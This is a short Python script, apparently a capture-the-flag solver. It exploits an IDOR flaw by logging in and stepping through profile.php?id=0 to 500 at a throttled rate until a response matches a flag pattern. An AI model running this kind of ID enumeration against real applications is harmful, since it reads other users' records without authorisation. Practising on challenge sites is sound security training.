import re
import time
from tqdm import tqdm
from init import login, domain, flag_pattern


profile_url = domain + "profile.php"


def idor_flag(start, end):
    session = login()
    print(f"IDOR on User Profile via `id` ({start} - {end})")
    pbar = tqdm(total=end + 1 - start, dynamic_ncols=True)
    rate = 30
    delay = 60 / rate
    last_req_time = time.monotonic() - delay
    for i in range(start, end + 1):
        url = f"{profile_url}/?id={i}"
        resp = session.get(url)

        if re.search(flag_pattern, resp.text) is not None:
            print(f"Flag found in id-{i}")
            print(re.search(flag_pattern, resp.text).group(0))
            return

        elapsed_time = time.monotonic() - last_req_time
        if elapsed_time < delay:
            time.sleep(delay - elapsed_time)
        last_req_time = time.monotonic()
        pbar.update()
    pbar.close()
    session.close()
    print("No flag found")


idor_flag(0, 500)
